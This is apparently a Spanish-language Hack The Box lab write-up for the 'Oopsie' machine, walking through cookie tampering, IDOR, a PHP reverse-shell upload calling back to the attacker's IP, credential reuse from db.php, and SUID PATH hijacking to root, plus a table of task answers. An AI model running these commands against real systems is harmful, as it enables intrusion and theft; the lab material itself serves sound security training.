---
title: "HTB - Oopsie"
tags:
  - htb
  - starting-point
  - tier-2
  - linux
  - web
  - idor
  - suid
  - path-hijacking
aliases:
  - oopsie
created: 2026-04-29
difficulty: very-easy
os: Linux
ip: 10.129.123.63
status: pwned
related:
  - "[[METHODOLOGY-Linux-Privesc]]"
  - "[[CONCEPT-SUID-y-PATH-hijacking]]"
---

# HTB - Oopsie

> [!info] Overview
> Starting Point Tier 2 box. El flujo completo es:
>
> **reconnaissance -> cookie tampering -> IDOR -> unrestricted file upload -> RCE -> credential discovery -> SSH -> SUID binary -> PATH hijacking -> root**.
>
> La difficulty oficial es `very-easy`, pero para un primer contacto no se siente tan easy: combina varias ideas pequeñas que aparecen muchísimo en HTB.

## TL;DR

1. HTTP expone una web app en el puerto `80`.
2. Directory brute forcing descubre `/cdn-cgi/login/`.
3. "Login as Guest" permite entrar con rol limitado.
4. Cookie tampering cambia `role=guest` a `role=admin`.
5. IDOR permite enumerar usuarios y encontrar el admin ID `34322`.
6. El panel admin permite subir un PHP reverse shell.
7. Ejecutar `/uploads/shell.php` da RCE como `www-data`.
8. `db.php` contiene credenciales reutilizadas para `robert`.
9. `robert` pertenece al grupo `bugtracker`.
10. `/usr/bin/bugtracker` es SUID-root y llama a `cat` sin absolute path.
11. PATH hijacking sobre `cat` da shell como `root`.

---

## Reconnaissance

La etapa de **reconnaissance** busca responder una pregunta simple: "Qué superficie de ataque tengo?". Antes de explotar algo, primero hay que saber qué servicios existen y qué información exponen.

### Port Scanning

```bash
sudo nmap -sC -sV -p- 10.129.123.63
```

Resultado relevante:

```text
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.29 Ubuntu
```

Interpretación:

- `22/tcp` es SSH. Normalmente requiere credenciales, así que al inicio no parece el vector principal.
- `80/tcp` es HTTP. Una web app suele tener rutas, parámetros, cookies, formularios y archivos interesantes.

Conclusión: el initial foothold probablemente sale de HTTP.

### Web Enumeration

La home parece una web temática de autos y no muestra un login evidente. Eso no significa que no exista: solo significa que no está linkeado desde la página principal.

```bash
gobuster dir -u http://10.129.123.63 -w /usr/share/wordlists/dirb/common.txt -x php
```

Hallazgo importante:

```text
/cdn-cgi/login/
```

> [!note] Concept: directory brute forcing
> Directory brute forcing prueba rutas comunes contra el servidor web usando una wordlist. Sirve para encontrar endpoints no enlazados, paneles ocultos, backups y archivos olvidados.
>
> `cdn-cgi` suele asociarse a Cloudflare. En esta box funciona como una ruta "rara" que igual aparece si enumerás con una wordlist.

---

## Foothold: Cookie Tampering + IDOR

El objetivo del **foothold** es conseguir la primera ejecución o acceso útil dentro del sistema. En Oopsie, el foothold empieza con una falla de autorización en la web app.

### Step 1: Login As Guest

Entrando a `/cdn-cgi/login/`, aparece la opción "Login as Guest". Después del login, el panel es limitado.

En Firefox DevTools:

```text
F12 -> Storage/Application -> Cookies
```

Cookies relevantes:

```text
user = 2233
role = guest
```

El problema aparece porque el rol está guardado client-side. Si el servidor confía en esa cookie para decidir permisos, el atacante puede modificarla.

### Step 2: Find Admin Routes

Desde el panel guest aparecen rutas como:

```text
http://10.129.123.63/cdn-cgi/login/admin.php?content=accounts
http://10.129.123.63/cdn-cgi/login/admin.php?content=uploads
```

Acceder directamente como guest devuelve `403`, pero la URL ya revela cómo está organizada la app.

### Step 3: Cookie Tampering

Modificar cookies desde DevTools:

```text
user = 34322
role = admin
```

> [!important] Concept: cookie tampering
> Cookie tampering significa modificar cookies manualmente para alterar el comportamiento de la aplicación.
>
> Una cookie nunca debería ser fuente de autoridad para permisos sensibles. Si el servidor recibe `role=admin`, debe validarlo contra una sesión server-side o contra la base de datos, no creerlo porque vino en el request.

### Step 4: IDOR

El ID `34322` corresponde al usuario admin. Se puede descubrir enumerando IDs en el parámetro `id`.

```bash
seq 1 50000 > ids.txt

ffuf -w ids.txt \
  -u "http://10.129.123.63/cdn-cgi/login/admin.php?content=accounts&id=FUZZ" \
  -b "user=2233; role=admin" \
  -mr "admin" \
  -s
```

> [!tip] Concept: IDOR
> **IDOR** significa **Insecure Direct Object Reference**.
>
> Ocurre cuando una app permite acceder a objetos cambiando un identificador, por ejemplo `?id=123`, sin verificar que el usuario tenga permiso sobre ese objeto.
>
> La regla mental: si cambio un ID y veo datos que no deberían ser míos, probablemente hay IDOR.

Con `role=admin` y `user=34322`, el panel admin queda accesible, incluyendo la sección `Uploads`.

---

## RCE: Unrestricted File Upload

La sección `Uploads` permite subir archivos sin filtrar correctamente extensión, content type o contenido real. Como Apache ejecuta PHP, subir un `.php` puede convertirse en **RCE**.

### Step 1: Prepare The Reverse Shell

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
ip a show tun0 | grep "inet "
nano /tmp/shell.php
```

Editar:

```php
$ip = '10.10.17.35';
$port = 4444;
```

> [!warning] Common mistake: tun0 IP vs broadcast
> En `ip a`, copiá la IP del campo `inet`, no la de `brd`.
>
> `inet 10.10.17.35` es tu VPN IP. `brd 10.10.17.255` es broadcast y no sirve como host para recibir la shell.

### Step 2: Start The Listener

```bash
nc -lvnp 4444
```

### Step 3: Upload The PHP File

Desde el panel admin:

```text
Uploads -> seleccionar shell.php -> Upload
```

> [!note] Concept: unrestricted file upload
> Unrestricted file upload aparece cuando una app acepta archivos peligrosos sin controles server-side suficientes.
>
> Las preguntas clave son: qué extensiones acepta, dónde guarda el archivo, si el directorio ejecuta scripts y si el archivo queda accesible por web.

### Step 4: Trigger The Shell

No alcanza con visitar el directorio:

```text
http://10.129.123.63/uploads/
```

Eso devuelve `403` porque directory listing está deshabilitado. Hay que pedir el archivo exacto:

```bash
curl -b "user=34322; role=admin" "http://10.129.123.63/uploads/shell.php"
```

En el listener:

```text
connect to [10.10.17.35] from (UNKNOWN) [10.129.123.63] 51234
$
```

La shell cae como:

```bash
www-data
```

> [!tip] Concept: 403 is ambiguous
> `403 Forbidden` no siempre significa "tu usuario no tiene permisos".
>
> En `/uploads/`, Apache bloquea listar el directorio porque no hay index y `Options -Indexes` está activo. Pero un archivo conocido dentro de ese directorio puede seguir siendo accesible.

### Step 5: Stabilize The Shell

Una reverse shell básica de `nc` no tiene TTY completa. Se puede mejorar así:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Luego:

```text
Ctrl+Z
```

En la terminal local:

```bash
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement: www-data To robert

Con `www-data` no somos un usuario real de la máquina, sino el usuario del web server. El siguiente objetivo es pasar a un usuario del sistema.

### Step 1: Credential Discovery

Las web apps suelen guardar credenciales de base de datos en archivos de configuración. En Apache, una ruta común es `/var/www/html/`.

```bash
cd /var/www/html/cdn-cgi/login
ls
cat db.php
```

Contenido relevante:

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Esto revela:

- DB user: `robert`
- DB password: `M3g4C0rpUs3r!`
- Database: `garage`

> [!important] Concept: credential reuse
> Credential reuse ocurre cuando la misma password se usa en más de un contexto.
>
> Acá la password de la base de datos también sirve para SSH como `robert`. No siempre pasa, pero siempre vale la pena probarlo con criterio.

> [!warning] Hay más de una password
> En esta carpeta también aparece `MEGACORP_4dm1n!!`, pero esa pertenece al admin de la web app. La que sirve para SSH como `robert` está en `db.php`.

### Step 2: SSH As robert

Desde Kali:

```bash
ssh robert@10.129.123.63
```

Password:

```text
M3g4C0rpUs3r!
```

User flag:

```text
/home/robert/user.txt
```

---

## Privilege Escalation: SUID + PATH Hijacking

Ya tenemos un usuario del sistema. Ahora el objetivo es pasar de `robert` a `root`.

### Step 1: Local Enumeration

```bash
id
```

Resultado:

```text
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

`bugtracker` no es un grupo estándar de Linux. Cuando aparece un grupo custom, conviene buscar archivos asociados.

```bash
sudo -l
```

Resultado:

```text
Sorry, user robert may not run sudo on oopsie.
```

No hay camino por `sudo`, así que buscamos otra vía.

### Step 2: Find Files Owned By The Group

```bash
find / -group bugtracker 2>/dev/null
```

Resultado:

```text
/usr/bin/bugtracker
```

Permisos:

```bash
ls -la /usr/bin/bugtracker
```

```text
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

> [!important] Concept: SUID
> **SUID** hace que un binario se ejecute con los permisos del owner del archivo, no con los permisos del usuario que lo lanzó.
>
> En `-rwsr-xr--`, la `s` en los permisos del owner indica SUID. Como el owner es `root`, el programa corre con privilegios de `root`.
>
> `robert` puede ejecutarlo porque pertenece al grupo `bugtracker`.

### Step 3: Understand The Binary

Ejecutarlo:

```bash
/usr/bin/bugtracker
```

Salida:

```text
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 1
---------------
cat: /root/reports/1: No such file or directory
```

El error revela que el binario intenta ejecutar `cat /root/reports/<input>`.

Con `strings` se confirma:

```bash
strings /usr/bin/bugtracker | grep -E "cat|reports"
```

```text
cat /root/reports/
```

El detalle crítico: usa `cat`, no `/bin/cat`.

### Step 4: PATH Hijacking

Cuando un programa ejecuta `cat` sin absolute path, Linux lo busca usando la variable `PATH`.

Si ponemos un directorio controlado por nosotros al principio de `PATH` y creamos ahí un archivo llamado `cat`, el binario vulnerable ejecutará nuestro archivo en vez del `cat` real.

Como `bugtracker` corre con SUID-root, nuestro falso `cat` también se ejecuta con privilegios de `root`.

```bash
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

Cuando pregunte el bug ID:

```text
Provide Bug ID: 1
```

Se obtiene shell:

```bash
# id
uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

> [!tip] Concept: PATH hijacking
> PATH hijacking explota programas que llaman comandos sin absolute path.
>
> Patrón vulnerable: `cat`, `cp`, `tar`, `sh`, `bash`.
>
> Patrón seguro: `/bin/cat`, `/bin/cp`, `/usr/bin/tar`.

### Step 5: Read Flags

Después del PATH hijacking, `cat` apunta a nuestro script falso. Por eso conviene llamar al `cat` real con absolute path:

```bash
/bin/cat /root/root.txt
/bin/cat /home/robert/user.txt
```

---

## Key Lessons

### Technical Patterns

1. **Client-side data is attacker-controlled.** Cookies, headers y parámetros pueden modificarse. No deben usarse como fuente final de autorización.
2. **Authorization must be server-side.** IDOR aparece cuando el servidor no valida ownership o permisos sobre el objeto pedido.
3. **Uploads are dangerous by default.** Si un archivo subido queda en un directorio ejecutable y accesible por web, puede terminar en RCE.
4. **Config files often leak credentials.** Revisar `/var/www/html/`, `.env`, configs PHP, backups y archivos con nombres como `db`, `config` o `settings`.
5. **Custom groups are clues.** Si un usuario pertenece a un grupo no estándar, buscar archivos asociados a ese grupo.
6. **SUID + relative command = privilege escalation candidate.** Si un SUID binary ejecuta `cat` en vez de `/bin/cat`, revisar PATH hijacking.

### Mindset

- Hacer reconnaissance antes de explotar.
- No asumir que un `403` significa siempre lo mismo.
- Leer errores: muchas veces revelan rutas internas o comandos ejecutados.
- Probar credential reuse cuando encontrás una password real.
- En privilege escalation, buscar permisos raros, grupos custom y SUID binaries.

---

## Official Tasks

| # | Question | Answer |
|---|---|---|
| 1 | Tool to intercept web traffic | `Proxy` |
| 2 | Path to login page | `/cdn-cgi/login` |
| 3 | What to modify in Firefox | `Cookie` |
| 4 | Admin access ID | `34322` |
| 5 | Where uploaded files appear | `/uploads/` |
| 6 | File with shared password | `db.php` |
| 7 | Executable run with `-group` | `find` |
| 8 | Permission bit independent of caller | `SUID` |
| 9 | User flag | `/home/robert/user.txt` |
| 10 | Insecurely called binary | `cat` |
| - | Root flag | `/root/root.txt` |

---

## References

- IppSec walkthrough
- 0xdf writeup
- HTB Academy: Login Brute Forcing